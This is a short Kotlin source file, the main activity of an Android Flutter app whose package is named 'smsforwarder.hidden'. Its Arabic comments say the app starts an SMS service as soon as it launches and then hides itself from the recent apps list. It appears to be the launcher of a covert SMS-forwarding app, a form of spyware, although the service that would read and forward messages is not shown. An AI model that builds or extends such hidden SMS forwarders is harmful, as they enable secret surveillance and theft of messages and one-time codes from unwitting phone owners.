package com.smsforwarder.hidden

import android.content.Intent
import android.os.Build
import android.os.Bundle
import io.flutter.embedding.android.FlutterActivity

class MainActivity: FlutterActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // بدء الخدمة فور تشغيل التطبيق
        startSmsService()
        
        // إخفاء التطبيق من قائمة التطبيقات الحديثة
        finish()
    }
    
    private fun startSmsService() {
        val serviceIntent = Intent(this, SmsService::class.java)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
}